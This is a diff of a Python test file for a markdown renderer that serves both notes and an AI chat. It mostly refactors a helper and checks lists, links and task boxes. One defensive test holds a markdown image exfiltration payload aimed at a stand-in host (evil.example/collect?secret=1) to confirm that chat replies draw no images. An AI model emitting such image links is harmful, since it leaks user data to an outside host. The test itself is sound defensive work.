@@ -2,7 +2,7 @@ import re
 
 import pytest
 
-from app.services.markdown_rendering import markdown_task_lines, render_markdown_to_html, render_note_markdown_to_html
+from app.services.markdown_rendering import markdown_task_lines, render_markdown_to_html, render_note_markdown
 
 
 def test_ordered_list_continues_across_blank_lines_between_items() -> None:
@@ -193,6 +193,10 @@ def test_escaped_trailing_pipe_stays_in_the_last_cell() -> None:
     assert "<th>a</th><th>b |</th>" in rendered
 
 
+def note_html(markdown: str) -> str:
+    return render_note_markdown(markdown, takes_footnotes=True).html
+
+
 # Nested lists (2026-10-31): an item two or more columns (or a tab) deeper than its list
 # sits inside the item above it.
 @pytest.mark.parametrize(("markdown", "expected"), [
@@ -231,21 +235,21 @@ def test_an_indented_item_nests_inside_the_item_above(markdown: str, expected: s
     ("Wow! [link](https://e.com)", '<p>Wow! <a href="https://e.com" target="_blank" rel="noopener noreferrer">link</a></p>'),
 ])
 def test_a_note_draws_web_images(markdown: str, expected: str) -> None:
-    assert render_note_markdown_to_html(markdown) == expected
+    assert note_html(markdown) == expected
 
 
 def test_the_ai_chat_draws_no_images() -> None:
     # An image address in a reply would send data out when the browser loads it.
     rendered = render_markdown_to_html("![x](https://evil.example/collect?secret=1)")
     assert "<img" not in rendered
-    assert render_note_markdown_to_html("> quoted ![x](https://e.com/x.png)").count("<img") == 1
+    assert note_html("> quoted ![x](https://e.com/x.png)").count("<img") == 1
 
 
 # Tasks (2026-10-31): - [ ] and - [x] in a note are boxes numbered in order through the
 # note (quotes and nested lists included); the AI chat draws none.
 def test_tasks_are_numbered_boxes_in_a_note() -> None:
     markdown = "Groceries\n- [ ] milk\n- [x] bread\n  - [X] nested\n> - [ ] quoted\n1. [ ] numbered\n- [ ]\n- [link] not a task"
-    rendered = render_note_markdown_to_html(markdown)
+    rendered = note_html(markdown)
     boxes = re.findall(r'role="checkbox" aria-checked="(true|false)" data-task-index="(\d+)"', rendered)
     assert boxes == [("false", "0"), ("true", "1"), ("true", "2"), ("false", "3"), ("false", "4"), ("false", "5")]
     assert "<li>[link] not a task</li>" in rendered
